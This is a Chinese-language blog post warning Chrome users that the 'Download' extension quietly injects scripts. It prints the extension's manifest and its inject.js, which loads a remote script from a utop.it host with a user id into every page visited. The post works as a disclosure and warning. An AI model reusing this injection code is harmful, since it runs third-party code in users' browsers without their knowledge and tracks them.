---
layout: post
uri: /posts/150
permalink: /posts/150/index.html
title: 【提醒Chrome用户】不要再使用“Download”扩展！
category:
tag:
description:
disqus: false
lang: zh
---

本警告涉及的范围包括所有开发者为[chromeplayground.blogspot.com](http://chromeplayground.blogspot.com)的Chrome Extension：

* __Download__:
<https://chrome.google.com/webstore/detail/download/nccjoeeljedbmkidebclpoabijggpbdp>
* __Plugins__:
<https://chrome.google.com/webstore/detail/plugins/chemohaemmfhjpmlgkmkanfpfbkaihop>
* 其他。

首先，这个网站的名字非常具有迷惑性（Chrome Playground），其实和Chromium / Google Chrome的官方开发者并无任何关系。（所以我现在总算知道为什么Oracle要用尽一切手段保护他们的产品商标了，也许Google应该在这方面跟人家学学……）

然后，如果你没有用过这个Download扩展的话：它只是单纯的一个按钮，点击后可以直接打开一个标签到Chrome的下载页面。虽然我现在一般都直接用`Ctrl-J`，不过因为这个扩展是很久很久以前装的（貌似还是在我用Windows Vista做主要工作系统的时代），因为Chrome的各种同步一直保留到了现在。因为只是工具栏旁边的一个下载按钮（而且和Chrome本身的下载图标长得也一模一样），看起来实在是人畜无害，所以留着也就留着了。

然后，在最近几天前，Chromium提醒我这个Download扩展升级了，要求更多权限，因为觉得它人畜无害，所以想都没想就点了同意。

再然后，就在昨天，发现Twitter信息流里的所有推点击之后都完全没反应了，不能再像往常那样自动展开Details。另外，在输入区域点击之后，“Compose new Tweet”字样不会消失，点了Tweet也没反应。如下：

<img src="http://i.imgur.com/ua8p4WN.png" width="40%" />

无独有偶，在[ruby-doc.org](http://ruby-doc.org/)上查看Ruby文档时，那个“click to toggle source”点击之后也没反应，所以可以确定这不是Twitter本身的问题。

升级了一下Chromium，问题依然存在。Firefox下面没有这个问题。发现在Chromium的隐身模式下面也不存在这个问题。排除法，只可能是Chromium的某个扩展导致的。这个时候才发现自己的扩展装得似乎有点多（汗- -||），一个个禁掉再刷新页面，最后找到了这个有问题的扩展：[Download](https://chrome.google.com/webstore/detail/download/nccjoeeljedbmkidebclpoabijggpbdp)。禁用之后，Twitter页面立马恢复正常了。

废话不多说，直接去看源码。这个扩展在这里：

`~/.config/chromium/Default/Extensions/nccjoeeljedbmkidebclpoabijggpbdp/0.1.7_0/`

`manifest.json`:

```javascript
"content_scripts": [ {
  "js": [ "fdi/inject.js" ],
  "matches": [ "http://*/*", "https://*/*" ],
  "run_at": "document_start"
} ],
```

一个单纯用来打开Chrome下载页面的扩展，为什么要在我访问的所有页面上inject东西？这尼玛一看就有问题。

再一看这个`fdi/inject.js`：

```javascript
function inj(){
    if (document){
        var _head = document.getElementsByTagName( "head" );

        if (_head[ 0 ]){
            var _domain = document.domain;
            if( _domain && _domain.toLowerCase().indexOf("utop.it") == -1){
                var script = document.createElement("script");
                script.type = "text/javascript";
                script.src = window.location.protocol + "//" + _appId
                    + ".utop.it/tb/host.jsp?pid=" + _pId
                    + "&br=gc&uid=" + getUserId() + "&pct=tb";
                script.id = "uti_script_chrome";
                _head[ 0 ].appendChild( script );
                setTimeout("getFrame()",30);
            }
        } else {
            setTimeout("inj()",50);
        }

    } else {
        setTimeout("inj()",50);
    }
}
```

在Chrome Developer下调试，这个扩展给我的页面inject的是这么一段JavaScript：

```xml
<script type=​"text/​javascript" src=​"http:​/​/​downloadext.utop.it/​
tb/​host.jsp?pid=31425&br=gc&uid=2013032920055234663&pct=tb"
id=​"uti_script_chrome">​</script>​
```

虽然不知道这个<http://downloadext.utop.it>是干嘛的，这段JavaScript又怎么会干扰到我正常的Twitter页面浏览，不过很显然这么做是不对滴，因为这个扩展的介绍里压根就没有提到这个utop.it网站，也不符合它本身声称提供的功能（只是“单纯地打开Chrome的下载页面”而已）。

然后，我找到了Google Chrome Forum上的这篇帖子：_[utop.it Chrome Browser Virus?](https://productforums.google.com/forum/?fromgroups=#!topic/chrome/2wBHACweWuM)_。

再然后，我就删除了这个Download扩展。再然后，我在Web Store里点了举报。再然后，就没有然后了。这个拥有20万用户的扩展会不会被Google下架，我不知道。

最后，几点总结：

1) 幸亏我没事还会刷刷Twitter或者偶尔去翻翻Ruby-Doc上的文档，不然还真没法发现这个扩展在我毫无知觉的情况下在给我访问的每个页面inject JS代码。（虽然主要是因为这段注入代码最近的某个版本出现了导致页面无法正常浏览的bug，以致于暴露了它的存在）

2) 以前我只知道国产Chrome扩展以流氓著称，其实，流氓并不是国产软件的专利。

3) 用户基数大、原本口碑好的软件不代表就一定不会做见不得人的事，就像这个拥有20多万用户的Download扩展。（我就不拿某些国产软件来类比说明了）

<img src="http://i.imgur.com/Cskqd92.png" width="100%" />

4) 用户安全想靠Chrome Web Store的人工审核，基本没戏。

5) 以后安装/升级Chrome扩展的时候，真的要看清楚再动手了。

<img src="http://i.imgur.com/lLKIUrJ.png" width="40%" />

如果一个声称自己仅仅是用来方便打开某个标签页的扩展，结果却要求访问“Your data on all websites”“Your tabs and browsing activity”的权限。如果开发者不是白痴，那就是开发者把用户当作肉鸡了。

你大概不可能在每装一个扩展之前都把它的源码自己过一遍，但是在最基本的[权限](http://support.google.com/chrome_webstore/bin/answer.py?hl=en&answer=186213&rd=1)上还是应该特别留神的。

<img src="http://i.imgur.com/FBEgYPn.png" width="80%" />

以上。如果有哪位Chrome用户发现最近访问Twitter的网页遇到过同样的问题的话：请把这个流氓扩展删掉吧。
